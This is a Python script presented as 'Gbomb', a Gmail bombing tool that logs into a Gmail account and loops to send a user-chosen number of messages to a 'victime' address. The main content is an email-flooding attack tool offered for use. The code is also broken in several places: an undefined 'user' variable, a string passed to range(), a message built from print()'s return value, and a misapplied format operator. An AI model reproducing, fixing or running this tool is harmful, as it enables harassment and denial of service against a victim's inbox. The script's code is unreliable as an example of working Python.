# Import some required modules
import os
import sys
import smtplib
from time import sleep
from colorama import Fore
from getpass import getpass

# Banner Function
def banner():
    print(
        Fore.GREEN
        + """
          _____ _                     _     
         / ____| |                   | |    
        | |  __| |__   ___  _ __ ___ | |__  
        | | |_ | '_ \ / _ \| '_ ` _ \| '_ \ 
        | |__| | |_) | (_) | | | | | | |_) |
     v1.1\_____|_.__/ \___/|_| |_| |_|_.__/ 
    """
    )
    print(
        Fore.BLUE
        + """
      Name       : Gbomb - Gmail Bombing Tool.
      Author     : Md. nur habib
      Email      : thenurhabib@Gmail.com
      GitHub     : github.com/thenurhabib
      HackerRank : hackerrank.com/thenurhabib\n      
        """
    )


#Call Banner Function
banner()

# login information (Username & Password)
loginCredentials = ["habib$username", "habib$password"]
# Get login information from user
print(Fore.WHITE + "Before Using This Tool You Have To Login First.")
getLoginUsername = input("Enter Username :  ")
getLoginPassword = getpass("Enter Password : ")

# Check Username and Password validation
if getLoginUsername == loginCredentials[0] and getLoginPassword == loginCredentials[1]:
    os.system("clear")
    print("\nLogin Succesfull.\nLoading Please Wait...")

    # Get Some Mail Bomping Information
    getGmailUser = input(Fore.MAGENTA + "Enter Your Gmail : ")
    getGmailPassword = getpass("Enter Your Gmail Password : ")
    getVictimeMailAddress = input(" Enter victime Mail Address : ")
    getTextmessagetoSend = input("Enter Your Text Message : ")
    howManyMail = input("How Many Mail/Mails You Want to Send : ")
    print("\nSending, Please Wait...")
    sleep(2)
    SmtpServer = "smtp.gmail.com"
    gmailServerPort = 587
    # Send Mails
    try:
        server = smtplib.SMTP(SmtpServer, gmailServerPort)
        server.ehlo()
        if SmtpServer == "smtp.gmail.com":
            server.starttls()
        server.login(getGmailUser, getGmailPassword)
        for i in range(1, howManyMail + 1):
            subject = os.urandom(9)
            messageForBomb = print(
                f"From {user} \nSubject {subject} \n {getTextmessagetoSend}"
            )
            server.sendmail(user, getVictimeMailAddress, messageForBomb)
            print("Email SENT  : %i") % i
            sys.stdout.flush()
        server.quit()
        print(f"{howManyMail} Mails are Sent Successfully.")

    except KeyboardInterrupt:
        print("Canceled")
        sys.exit()
    except smtplib.SMTPAuthenticationError:
        print(
            "The Username or Password You Entered is Incorrect. Please Check it and Try Again."
        )
        sys.exit()
#If Password or Username Wrong.
else:
    print(Fore.RED + "Wrong Login Information. Please Try Again.")
